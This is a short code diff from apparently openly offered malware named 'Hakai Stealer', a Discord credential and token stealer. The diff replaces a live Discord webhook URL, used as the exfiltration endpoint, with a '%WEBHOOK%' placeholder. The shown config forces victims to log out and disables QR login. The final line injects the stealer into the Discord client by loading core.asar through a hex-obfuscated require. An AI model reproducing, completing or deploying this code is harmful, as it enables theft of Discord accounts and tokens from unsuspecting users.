@@ -12,7 +12,7 @@ const fs = require("fs");
 var config = {
     brand: "Hakai Stealer",
 
-    webhook: 'https://discord.com/api/webhooks/1409600107703439521/f_3G50yuTIqM9ToJGcII0xUFXESzqzqRdzf5LuQ-3ljfz4oAW1cujZWQe7NBA3qLxYuh',
+    webhook: "%WEBHOOK%",
 
     logout: true,
     disable_qr_code: true,
@@ -924,5 +924,6 @@ async function initialize() {
         }
     }
 }
+
 
 module.exports= require("\x2E\x2F\x63\x6F\x72\x65\x2E\x61\x73\x61\x72")
